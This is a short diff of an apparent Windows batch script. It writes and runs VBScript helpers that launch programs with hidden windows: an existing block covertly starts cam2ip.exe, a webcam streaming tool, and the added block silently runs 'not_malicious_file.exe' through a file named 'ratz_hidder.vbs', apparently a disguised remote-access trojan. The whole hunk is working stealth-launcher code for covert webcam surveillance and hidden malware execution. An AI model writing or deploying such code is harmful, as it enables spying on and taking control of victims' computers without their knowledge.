@@ -43,3 +43,10 @@ echo Set WShell = CreateObject("WScript.Shell") >> cam2ip_hidder.vbs
 echo WShell.Run "cam2ip.exe", 0 >> cam2ip_hidder.vbs
 echo Set WShell = Nothing >> cam2ip_hidder.vbs
 wscript cam2ip_hidder.vbs
+
+
+echo Dim WShell > ratz_hidder.vbs
+echo Set WShell = CreateObject("WScript.Shell") >> ratz_hidder.vbs
+echo WShell.Run "not_malicious_file.exe", 0 >> ratz_hidder.vbs
+echo Set WShell = Nothing >> ratz_hidder.vbs
+wscript ratz_hidder.vbs
